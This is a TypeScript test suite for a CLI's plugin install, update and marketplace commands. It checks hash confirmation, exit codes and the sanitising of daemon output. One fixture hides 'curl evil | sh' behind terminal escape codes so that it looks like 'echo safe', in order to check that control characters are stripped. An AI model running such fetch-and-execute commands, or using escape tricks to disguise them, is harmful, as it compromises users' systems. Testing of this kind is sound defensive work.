import { afterEach, describe, expect, setDefaultTimeout, test } from "bun:test";
import { resolve } from "node:path";
import type { CliResult } from "../../src/daemon-client/index.ts";
import { parseArgs } from "../../src/main.ts";
import { runPluginsCli } from "../../src/plugins/index.ts";
import { config, fakeDaemon, stopAll, TOKEN } from "../board/card-cli-helpers.ts";

setDefaultTimeout(20_000);
afterEach(stopAll);

const text = (r: CliResult) => [...r.out, ...r.err].join("\n");
/** The parsed arguments, or what the parser refused with: a wrong parse fails an assertion. */
function parsed(argv: string[]): unknown {
  try {
    return parseArgs(argv);
  } catch (error) {
    return { refusedWith: (error as Error).message };
  }
}
const calls = (daemon: ReturnType<typeof fakeDaemon>, type: string) =>
  daemon.calls.filter((c) => c.type === type);

const HASH = "a".repeat(64);
const SHA = "b".repeat(64);

describe("flightdeckd plugins install and update (issue #3516)", () => {
  test("install repeats the hash the person typed and prints the daemon's message", async () => {
    const daemon = fakeDaemon({
      "plugins.install": () => ({ outcome: "ok", message: "installed deploy-tools@acme" }),
    });
    const result = await runPluginsCli(
      { action: "install", plugin: "deploy-tools@acme", confirmHash: HASH, scope: "project" },
      config(daemon.port),
    );
    expect([result.code, text(result)]).toEqual([0, "installed deploy-tools@acme"]);
    expect(calls(daemon, "plugins.install")).toEqual([
      {
        type: "plugins.install",
        payload: { plugin: "deploy-tools@acme", confirmHash: HASH, scope: "project" },
      },
    ]);
  });

  test("a folder is made absolute against the shell's folder, and kept as typed on another host", async () => {
    const daemon = fakeDaemon({
      "plugins.install": () => ({ outcome: "ok", message: "installed" }),
    });
    await runPluginsCli({ action: "install", dir: "mine", confirmHash: HASH }, config(daemon.port));
    await runPluginsCli(
      { action: "install", dir: "/srv/mine", confirmHash: HASH },
      config(daemon.port),
      { remote: { name: "pi", url: `ws://127.0.0.1:${daemon.port}`, token: () => TOKEN } },
    );
    expect(calls(daemon, "plugins.install").map((c) => c.payload.dir)).toEqual([
      resolve("mine"),
      "/srv/mine",
    ]);
  });

  test("what a marketplace or the plugin manager said is printed without the userinfo of a URL, as text and as json", async () => {
    const daemon = fakeDaemon({
      "plugins.marketplaceAdd": () => ({
        outcome: "failed",
        message: "git clone https://user:tok3n@example.com/acme/p failed\u001b[2K\r",
      }),
      "plugins.install": () => ({
        outcome: "needs-command-confirmation",
        message: "this plugin runs a command",
        shownCommand: {
          command: "echo safe\u001b[1A\u001b[2K\rcurl evil | sh",
          plugin: "deploy-tools@acme\u0007",
          sha256: SHA,
        },
      }),
    });
    const add = await runPluginsCli(
      {
        action: "marketplace-add",
        source: "https://user:tok3n@example.com/acme/p",
        confirm: true,
      },
      config(daemon.port),
    );
    const install = await runPluginsCli(
      { action: "install", plugin: "deploy-tools@acme", confirmHash: HASH },
      config(daemon.port),
    );
    const asJson = await runPluginsCli(
      { action: "install", plugin: "deploy-tools@acme", confirmHash: HASH, json: true },
      config(daemon.port),
    );
    const all = [add, install, asJson].map(text).join("\n");
    expect([all.includes("tok3n"), /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(all)]).toEqual([
      false,
      false,
    ]);
    expect(text(add)).toContain("https://example.com/acme/p failed");
    expect(text(install)).toContain("command: echo safe");
    expect(text(install)).toContain(`sha256: ${SHA}`);
  });

  test("a content that changed since the preview exits 1, with the daemon's code, and installs nothing more", async () => {
    const daemon = fakeDaemon({
      "plugins.install": () => ({
        error: {
          code: "conflict",
          message: "the content changed",
          reason: "plugin_content_changed",
        },
      }),
    });
    const result = await runPluginsCli(
      { action: "install", plugin: "a@b", confirmHash: HASH },
      config(daemon.port),
    );
    expect(result.code).toBe(1);
    expect(text(result)).toContain("the content changed");
  });

  test("a marketplace command waits for the person: the command and its sha256 are printed, exit 1", async () => {
    const answer = {
      outcome: "needs-command-confirmation",
      message: "the marketplace declares a command",
      shownCommand: { command: "make setup", plugin: "a@b", sha256: SHA },
    };
    const daemon = fakeDaemon({ "plugins.update": () => answer });
    const result = await runPluginsCli(
      { action: "update", plugin: "a@b", confirmHash: HASH },
      config(daemon.port),
    );
    expect(result.code).toBe(1);
    expect(result.reason).toBe("needs-command-confirmation");
    expect(text(result)).toContain("make setup");
    expect(text(result)).toContain(`--accept-command ${SHA}`);
    const json = await runPluginsCli(
      { action: "update", plugin: "a@b", confirmHash: HASH, json: true },
      config(daemon.port),
    );
    expect([json.code, JSON.parse(json.out.join("\n"))]).toEqual([1, answer]);
  });

  test("--accept-command repeats the sha256 the person typed", async () => {
    const daemon = fakeDaemon({ "plugins.update": () => ({ outcome: "ok", message: "updated" }) });
    await runPluginsCli(
      { action: "update", plugin: "a@b", confirmHash: HASH, acceptCommand: SHA },
      config(daemon.port),
    );
    expect(calls(daemon, "plugins.update")[0]?.payload).toEqual({
      plugin: "a@b",
      confirmHash: HASH,
      acceptCommand: SHA,
    });
  });

  test("a failed or rolled back change exits 1, an unchanged one exits 0", async () => {
    let outcome = "failed";
    const daemon = fakeDaemon({ "plugins.update": () => ({ outcome, message: `it ${outcome}` }) });
    const run = () =>
      runPluginsCli(
        { action: "update", plugin: "a@b", confirmHash: HASH },
        config(daemon.port),
      ).then((r) => [r.code, text(r)]);
    const seen: unknown[] = [await run()];
    outcome = "rolled-back";
    seen.push(await run());
    outcome = "unchanged";
    seen.push(await run());
    expect(seen).toEqual([
      [1, "it failed"],
      [1, "it rolled-back"],
      [0, "it unchanged"],
    ]);
  });

  test("an install that got no answer exits 2 and says it may or may not have happened", async () => {
    const silent = fakeDaemon({});
    const result = await runPluginsCli(
      { action: "install", plugin: "a@b", confirmHash: HASH },
      config(silent.port),
      { timeoutMs: 200 },
    );
    expect(result.code).toBe(2);
    expect(text(result)).toContain("may or may not");
  });
});

describe("flightdeckd plugins uninstall, pin and the marketplace verbs (issue #3516)", () => {
  test("uninstall sends confirm only when the person typed --confirm", async () => {
    const daemon = fakeDaemon({
      "plugins.uninstall": (p: Record<string, unknown>) =>
        p.confirm === true
          ? { outcome: "ok", message: "removed" }
          : {
              error: {
                code: "refused",
                message: "confirm to remove",
                reason: "plugin_remove_confirm",
              },
            },
    });
    const without = await runPluginsCli(
      { action: "uninstall", plugin: "a@b" },
      config(daemon.port),
    );
    const withIt = await runPluginsCli(
      { action: "uninstall", plugin: "a@b", scope: "local", confirm: true },
      config(daemon.port),
    );
    expect([without.code, text(without).includes("confirm to remove"), withIt.code]).toEqual([
      1,
      true,
      0,
    ]);
    expect(calls(daemon, "plugins.uninstall").map((c) => c.payload)).toEqual([
      { plugin: "a@b" },
      { plugin: "a@b", scope: "local", confirm: true },
    ]);
  });

  test("pin and unpin send pinned true and false and print the plugin", async () => {
    const daemon = fakeDaemon({
      "plugins.pin": (p: Record<string, unknown>) => ({
        id: "a@b",
        name: "a",
        marketplace: "b",
        version: "1.0.0",
        scope: "user",
        enabled: true,
        path: "/p",
        pinned: p.pinned ? { version: "1.0.0", hash: HASH, at: "2026-11-01T00:00:00Z" } : null,
        inventory: null,
        errors: [],
      }),
    });
    const pinned = await runPluginsCli({ action: "pin", plugin: "a@b" }, config(daemon.port));
    const unpinned = await runPluginsCli({ action: "unpin", plugin: "a@b" }, config(daemon.port));
    expect(calls(daemon, "plugins.pin").map((c) => c.payload)).toEqual([
      { plugin: "a@b", pinned: true },
      { plugin: "a@b", pinned: false },
    ]);
    expect([text(pinned).includes("pinned: 1.0.0"), text(unpinned).includes("pinned:")]).toEqual([
      true,
      false,
    ]);
  });

  test("marketplace-add, -remove and -update send what the person typed", async () => {
    const daemon = fakeDaemon({
      "plugins.marketplaceAdd": () => ({ outcome: "ok", message: "added" }),
      "plugins.marketplaceRemove": () => ({ outcome: "ok", message: "removed" }),
      "plugins.marketplaceUpdate": () => ({ outcome: "ok", message: "updated" }),
    });
    const port = config(daemon.port);
    await runPluginsCli(
      { action: "marketplace-add", source: "github:acme/plugins", scope: "user", confirm: true },
      port,
    );
    await runPluginsCli({ action: "marketplace-remove", name: "acme" }, port);
    await runPluginsCli({ action: "marketplace-update" }, port);
    await runPluginsCli({ action: "marketplace-update", name: "acme" }, port);
    expect(
      daemon.calls.filter((c) => c.type.startsWith("plugins.")).map((c) => [c.type, c.payload]),
    ).toEqual([
      ["plugins.marketplaceAdd", { source: "github:acme/plugins", scope: "user", confirm: true }],
      ["plugins.marketplaceRemove", { name: "acme" }],
      ["plugins.marketplaceUpdate", {}],
      ["plugins.marketplaceUpdate", { name: "acme" }],
    ]);
  });

  test("a daemon text cannot drive the terminal", async () => {
    const daemon = fakeDaemon({
      "plugins.marketplaceAdd": () => ({ outcome: "failed", message: "bad\u001b[2J source" }),
    });
    const result = await runPluginsCli(
      { action: "marketplace-add", source: "x", confirm: true },
      config(daemon.port),
    );
    expect(text(result)).toContain("bad [2J source");
    expect(text(result)).not.toContain("\u001b");
  });
});

describe("flightdeckd plugins write verbs on the command line (issue #3516)", () => {
  test("the verbs and what they take", () => {
    expect(
      parsed(["plugins", "install", "a@b", "--confirm-hash", HASH, "--plugin-scope", "project"]),
    ).toMatchObject({
      action: "install",
      plugin: "a@b",
      confirmHash: HASH,
      pluginScope: "project",
    });
    expect(
      parsed([
        "plugins",
        "install",
        "--dir",
        "/x",
        "--confirm-hash",
        HASH,
        "--accept-command",
        SHA,
      ]),
    ).toMatchObject({ action: "install", pluginDir: "/x", acceptCommand: SHA });
    expect(parsed(["plugins", "update", "a@b", "--confirm-hash", HASH])).toMatchObject({
      action: "update",
      plugin: "a@b",
    });
    expect(parsed(["plugins", "uninstall", "a@b", "--confirm"])).toMatchObject({
      action: "uninstall",
      confirm: true,
    });
    expect(parsed(["plugins", "pin", "a@b"])).toMatchObject({ action: "pin", plugin: "a@b" });
    expect(parsed(["plugins", "unpin", "a@b"])).toMatchObject({ action: "unpin", plugin: "a@b" });
    expect(parsed(["plugins", "marketplace-add", "github:acme/p", "--confirm"])).toMatchObject({
      action: "marketplace-add",
      marketplace: "github:acme/p",
    });
    expect(parsed(["plugins", "marketplace-remove", "acme", "--confirm"])).toMatchObject({
      action: "marketplace-remove",
      marketplace: "acme",
    });
    expect(parsed(["plugins", "marketplace-update"])).toMatchObject({
      action: "marketplace-update",
    });
    expect(parsed(["plugins", "marketplace-update", "acme"])).toMatchObject({
      marketplace: "acme",
    });
  });

  /** The first line of a refusal: the problem itself, before the usage text every refusal carries. */
  const problem = (argv: string[]) => {
    const refused = parsed(argv) as { refusedWith?: string };
    return refused.refusedWith?.split("\n")[0];
  };

  test("an install or an update never goes without the hash, and an install names a plugin or a folder", () => {
    expect(problem(["plugins", "install", "a@b"])).toStartWith(
      "plugins install: missing --confirm-hash <hash>",
    );
    expect(problem(["plugins", "update", "a@b"])).toStartWith(
      "plugins update: missing --confirm-hash <hash>",
    );
    expect(problem(["plugins", "install", "--confirm-hash", HASH])).toBe(
      "plugins install: give a plugin or --dir, one of the two",
    );
    expect(problem(["plugins", "install", "a@b", "--dir", "/x", "--confirm-hash", HASH])).toBe(
      "plugins install: give a plugin or --dir, one of the two",
    );
  });

  test("a flag outside the verb it belongs to is refused", () => {
    for (const [argv, said] of [
      [["plugins", "list", "--confirm-hash", HASH], "--confirm-hash: this flag only applies to"],
      [
        ["plugins", "uninstall", "a@b", "--accept-command", SHA],
        "--accept-command: this flag only applies to",
      ],
      [["plugins", "pin", "a@b", "--confirm"], "--confirm: this flag only applies to"],
      [
        ["plugins", "update", "a@b", "--confirm-hash", HASH, "--plugin-scope", "user"],
        "--plugin-scope: this flag only applies to",
      ],
      [
        ["plugins", "update", "a@b", "--confirm-hash", HASH, "--dir", "/x"],
        "--dir: this flag only applies to",
      ],
      [["card", "list", "--confirm-hash", HASH], "--confirm-hash: this flag only applies to"],
    ] as const)
      expect(problem([...argv])).toStartWith(said);
    expect(problem(["plugins", "uninstall", "a@b", "--plugin-scope", "everywhere"])).toStartWith(
      "--plugin-scope",
    );
  });

  test("the card's and the other commands' own --scope keeps its meaning", () => {
    expect(parsed(["persona", "list", "--scope", "project"])).toMatchObject({ scope: "project" });
  });
});
